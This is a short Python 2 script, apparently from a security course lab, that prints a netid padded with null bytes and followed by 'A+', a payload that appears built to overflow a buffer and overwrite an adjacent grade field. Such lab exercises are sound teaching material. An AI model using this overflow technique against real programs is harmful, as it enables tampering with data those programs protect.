#!/user/bin/python


netid = raw_input()
length = len(netid)

print netid + (10 - length) * '\00' + 'A+'
